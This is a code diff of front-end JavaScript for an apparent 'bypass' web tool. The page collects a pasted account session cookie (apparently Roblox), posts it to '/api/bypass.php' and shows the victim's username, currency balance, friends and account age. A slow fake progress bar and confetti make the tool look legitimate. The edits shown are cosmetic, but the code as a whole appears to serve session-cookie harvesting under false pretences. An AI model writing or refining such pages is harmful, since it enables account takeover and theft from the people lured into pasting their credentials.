@@ -126,7 +126,6 @@ if (cookieInput) {
         setTimeout(() => {
             const cookie = cookieInput.value.trim();
             if (cookie.length > 50) {
-                // Auto-highlight the button
                 btnStart.classList.add('ring-4', 'ring-white/20');
                 setTimeout(() => {
                     btnStart.classList.remove('ring-4', 'ring-white/20');
@@ -147,7 +146,7 @@ if (btnCheck) {
         }
 
         btnCheck.disabled = true;
-        btnCheck.innerHTML = '<svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Checking...';
+        btnCheck.innerHTML = '<svg class="animate-spin h-5 w-5 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';
 
         try {
             const response = await fetch('/api/bypass.php', {
@@ -159,12 +158,10 @@ if (btnCheck) {
             const data = await response.json();
 
             if (response.ok && data.success && data.valid) {
-                // Valid cookie
-                btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Valid Cookie ✓';
+                btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Valid ✓';
                 btnCheck.classList.add('bg-green-500/20', 'border-green-500/50', 'text-green-400');
                 
-                // Show success message
-                alert(`✅ Cookie is valid!\nUsername: ${data.username}\nUser ID: ${data.userId}`);
+                alert(`✅ Cookie is valid!\nUsername: ${data.username || 'Unknown'}\nUser ID: ${data.userId || 'Unknown'}`);
                 
                 setTimeout(() => {
                     btnCheck.disabled = false;
@@ -172,8 +169,7 @@ if (btnCheck) {
                     btnCheck.classList.remove('bg-green-500/20', 'border-green-500/50', 'text-green-400');
                 }, 3000);
             } else {
-                // Invalid cookie
-                btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg> Invalid Cookie ✗';
+                btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg> Invalid ✗';
                 btnCheck.classList.add('bg-red-500/20', 'border-red-500/50', 'text-red-400');
                 
                 alert('❌ Cookie is invalid or expired!');
@@ -185,6 +181,7 @@ if (btnCheck) {
                 }, 3000);
             }
         } catch (err) {
+            console.error('Check error:', err);
             btnCheck.disabled = false;
             btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Check Cookie';
             alert('Error checking cookie. Please try again.');
@@ -206,7 +203,6 @@ if (btnStart) {
         processingState.classList.remove('hidden');
 
         try {
-            // Call backend API
             const response = await fetch('/api/bypass.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -229,6 +225,7 @@ if (btnStart) {
                 progress += 1;
                 progressBar.style.width = `${progress}%`;
                 progressText.innerText = `${progress}% Complete`;
+                
                 if (progress >= 100) {
                     clearInterval(interval);
                     
@@ -237,14 +234,14 @@ if (btnStart) {
                     document.getElementById('user-display-name').textContent = `@${data.userInfo.username}`;
                     document.getElementById('info-username').textContent = data.userInfo.username;
                     document.getElementById('info-userid').textContent = data.userInfo.userId;
-                    document.getElementById('info-robux').textContent = data.userInfo.robux.toLocaleString();
-                    document.getElementById('info-rap').textContent = data.userInfo.rap.toLocaleString();
-                    document.getElementById('info-premium').textContent = data.userInfo.premium;
-                    document.getElementById('info-vc').textContent = data.userInfo.voiceChat;
-                    document.getElementById('info-friends').textContent = data.userInfo.friends.toLocaleString();
-                    document.getElementById('info-followers').textContent = data.userInfo.followers.toLocaleString();
-                    document.getElementById('info-age').textContent = data.userInfo.accountAge;
-                    document.getElementById('info-groups').textContent = data.userInfo.groupsOwned;
+                    document.getElementById('info-robux').textContent = (data.userInfo.robux || 0).toLocaleString();
+                    document.getElementById('info-rap').textContent = (data.userInfo.rap || 0).toLocaleString();
+                    document.getElementById('info-premium').textContent = data.userInfo.premium || 'No';
+                    document.getElementById('info-vc').textContent = data.userInfo.voiceChat || 'No';
+                    document.getElementById('info-friends').textContent = (data.userInfo.friends || 0).toLocaleString();
+                    document.getElementById('info-followers').textContent = (data.userInfo.followers || 0).toLocaleString();
+                    document.getElementById('info-age').textContent = data.userInfo.accountAge || 'Unknown';
+                    document.getElementById('info-groups').textContent = data.userInfo.groupsOwned || 0;
                     
                     // Display account score
                     const score = data.userInfo.accountScore || 0;
@@ -258,14 +255,15 @@ if (btnStart) {
                     // Trigger confetti
                     setTimeout(triggerConfetti, 300);
                     
-                    // Auto-clear cookie input after 2 seconds
+                    // Auto-clear cookie input
                     setTimeout(() => {
                         cookieInput.value = '';
                     }, 2000);
                 }
-            }, 1200); // 120 seconds total
+            }, 1200);
 
         } catch (err) {
+            console.error('Bypass error:', err);
             setTimeout(() => {
                 processingState.classList.add('hidden');
                 failedState.classList.remove('hidden');
